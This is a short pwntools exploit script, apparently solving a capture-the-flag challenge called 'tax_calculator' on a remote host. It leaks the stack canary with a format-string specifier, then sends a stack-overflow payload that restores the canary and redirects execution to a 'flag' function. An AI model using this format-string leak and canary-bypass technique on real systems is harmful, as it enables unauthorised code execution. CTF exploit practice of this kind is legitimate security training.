from pwn import *

elf = context.binary = ELF('./tax_calculator')
context.log_level = 'debug'
context.terminal = 'kitty'

offset = 77

p = remote('chal1.gryphons.sg', 10000)

p.sendlineafter(': ', "%17$p")
p.recvuntil('You entered: ')
canary = int(p.recvline().decode().strip('\n'), 16)
log.info("canary, %#x", canary)

payload = flat({
    offset: [
        p64(canary),
        b'A' * 8,
        0x0000000000401016,
        elf.sym.flag
        ]
    })

p.sendlineafter('>', payload)

print(p.recvall())
